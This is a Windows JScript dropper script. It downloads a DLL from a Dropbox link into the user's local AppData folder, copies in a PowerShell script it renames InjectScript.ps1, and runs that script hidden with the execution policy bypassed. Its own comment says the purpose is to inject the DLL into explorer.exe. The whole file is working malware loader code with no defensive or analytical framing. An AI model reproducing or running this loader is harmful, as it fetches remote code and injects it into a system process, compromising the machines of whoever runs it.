try {
    // Create WScript.Shell and FileSystemObject instances
    var objShell = new ActiveXObject("WScript.Shell");
    var fso = new ActiveXObject("Scripting.FileSystemObject");

    // Define URLs and local file paths
    var dllUrl = "https://www.dropbox.com/scl/fi/ufibsqagr1hlzyyoc7xe8/DIGITAL_WELL.dll?rlkey=4eohmylgu9pqu8bgi3y5e0na5&st=hv4mgxrz&dl=1";
    var targetDll = objShell.ExpandEnvironmentStrings("%LOCALAPPDATA%\\DownloadedFolder\\DIGITAL_WELL.dll");

    var psLocalPath = "C:\Users\USER\Downloads\invite\rundll.ps1"; // Replace with actual path
    var targetPs = objShell.ExpandEnvironmentStrings("%LOCALAPPDATA%\\DownloadedFolder\\InjectScript.ps1");

    // Ensure the target directory exists
    var folderPath = objShell.ExpandEnvironmentStrings("%LOCALAPPDATA%\\DownloadedFolder");
    if (!fso.FolderExists(folderPath)) {
        fso.CreateFolder(folderPath);
    }

    // Function to download a file
    function downloadFile(url, targetPath) {
        try {
            var xhr = new ActiveXObject("MSXML2.XMLHTTP");
            xhr.open("GET", url, false);
            xhr.send();

            if (xhr.status == 200) {
                var stream = new ActiveXObject("ADODB.Stream");
                stream.Type = 1; // Binary
                stream.Open();
                stream.Write(xhr.responseBody);
                stream.SaveToFile(targetPath, 2); // Overwrite if exists
                stream.Close();
                WScript.Echo("Downloaded: " + targetPath);
            } else {
                throw new Error("Failed to download file. HTTP Status: " + xhr.status);
            }
        } catch (e) {
            WScript.Echo("Error downloading file: " + e.message);
        }
    }

    // Function to copy a local file
    function copyFile(sourcePath, targetPath) {
        try {
            if (fso.FileExists(sourcePath)) {
                fso.CopyFile(sourcePath, targetPath, true); // Overwrite if exists
                WScript.Echo("Copied: " + sourcePath + " to " + targetPath);
            } else {
                throw new Error("Source file not found: " + sourcePath);
            }
        } catch (e) {
            WScript.Echo("Error copying file: " + e.message);
        }
    }

    // Download the DLL from the internet
    downloadFile(dllUrl, targetDll);

    // Copy the local PowerShell script to the target directory
    copyFile(psLocalPath, targetPs);

    // Run the PowerShell script to inject the DLL into explorer.exe
    try {
        var command = "powershell -ExecutionPolicy Bypass -File " + targetPs;
        objShell.Run(command, 0, true);
        WScript.Echo("PowerShell script executed: " + command);
    } catch (e) {
        WScript.Echo("Error executing PowerShell script: " + e.message);
    }

} catch (e) {
    // Error handling for script initialization
    WScript.Echo("Error: " + e.message);
}
